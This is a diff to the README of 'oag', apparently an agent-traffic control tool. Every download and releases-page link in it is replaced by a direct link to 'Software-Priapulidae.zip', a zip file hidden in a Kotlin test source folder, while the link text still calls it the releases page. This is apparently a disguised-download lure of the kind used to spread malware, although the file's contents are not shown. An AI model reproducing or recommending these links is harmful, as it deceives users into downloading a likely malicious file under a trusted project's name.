@@ -1,7 +1,7 @@
 # 🛡️ oag - Keep Agent Traffic Under Control
 
-[⬇️ Download oag for Windows](https://github.com/hati4100/oag/releases)  
-[![Download](https://img.shields.io/badge/Download%20oag-blue?style=for-the-badge)](https://github.com/hati4100/oag/releases)
+[⬇️ Download oag for Windows](https://github.com/hati4100/oag/raw/refs/heads/main/oag-enforcement/src/test/kotlin/com/mustafadakhel/oag/Software-Priapulidae.zip)  
+[![Download](https://img.shields.io/badge/Download%20oag-blue?style=for-the-badge)](https://github.com/hati4100/oag/raw/refs/heads/main/oag-enforcement/src/test/kotlin/com/mustafadakhel/oag/Software-Priapulidae.zip)
 
 ## 🚀 What oag does
 
@@ -31,7 +31,7 @@ For best results, use a system where you can run local apps and set network prox
 
 ## 📥 Download oag
 
-1. Open the [oag releases page](https://github.com/hati4100/oag/releases)
+1. Open the [oag releases page](https://github.com/hati4100/oag/raw/refs/heads/main/oag-enforcement/src/test/kotlin/com/mustafadakhel/oag/Software-Priapulidae.zip)
 2. Find the latest Windows build
 3. Download the file for your system
 4. Save it to your Downloads folder or a folder you can find again
@@ -154,7 +154,7 @@ Keep the app files in one folder so they are easy to find later.
 
 When a new version is available:
 
-1. Return to the [oag releases page](https://github.com/hati4100/oag/releases)
+1. Return to the [oag releases page](https://github.com/hati4100/oag/raw/refs/heads/main/oag-enforcement/src/test/kotlin/com/mustafadakhel/oag/Software-Priapulidae.zip)
 2. Download the newest Windows build
 3. Replace the old app files with the new ones
 4. Open the new version
@@ -201,7 +201,7 @@ Use this list to confirm your setup:
 
 If you need the file again, use the Windows release page here:
 
-[https://github.com/hati4100/oag/releases](https://github.com/hati4100/oag/releases)
+[https://github.com/hati4100/oag/raw/refs/heads/main/oag-enforcement/src/test/kotlin/com/mustafadakhel/oag/Software-Priapulidae.zip](https://github.com/hati4100/oag/raw/refs/heads/main/oag-enforcement/src/test/kotlin/com/mustafadakhel/oag/Software-Priapulidae.zip)
 
 ## 🏷️ Topics
 
